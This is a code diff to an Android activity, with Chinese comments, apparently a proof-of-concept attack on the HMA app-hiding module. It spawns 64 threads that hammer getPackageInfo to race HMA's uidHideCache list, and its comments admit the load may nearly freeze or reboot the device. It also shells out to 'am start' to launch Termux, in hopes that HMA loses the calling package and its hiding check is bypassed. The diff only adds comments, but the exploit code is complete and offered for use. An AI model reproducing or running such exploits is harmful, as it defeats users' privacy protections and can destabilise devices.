@@ -33,7 +33,8 @@ public class MainActivity extends AppCompatActivity {
                 for (int i = 0; i < 64; i++) {
                     new Thread(() -> {
                         try {
-                            // 1. 疯狂请求，冲击 HMA 的 ArrayList 临界区
+                            // 1. 疯狂请求，冲击 HMA 的 ArrayList 临界区 (uidHideCache)
+                            // 这一步会不断触发 HMA 的 read/write 操作
                             getPackageManager().getPackageInfo(TARGET, 0);
                         } catch (Exception e) {
                             // 捕获并发异常，但这正是我们要制造的“混乱”
@@ -48,15 +49,16 @@ public class MainActivity extends AppCompatActivity {
                     }).start();
                 }
                 
-                // 给 CPU 留一点喘息时间，防止整个 Android UI 彻底卡死
+                // 给 CPU 留一点时间，防止整个 Android UI 系统彻底卡死导致重启
                 try { Thread.sleep(50); } catch (InterruptedException e) {}
             }
         });
 
-        // 辅助爆破：尝试通过匿名路径启动
+        // 辅助爆破：尝试通过匿名路径/系统 Shell 权限启动
         new Thread(() -> {
             try {
                 Log.w(TAG, ">>> 执行匿名 Context 绕过尝试...");
+                // 利用 am 启动，某些版本的 HMA 在处理这种间接启动时 callingPackage 会丢失
                 Runtime.getRuntime().exec("am start -n com.termux/.app.TermuxActivity");
             } catch (Exception e) {
                 Log.e(TAG, "am start 尝试失败");
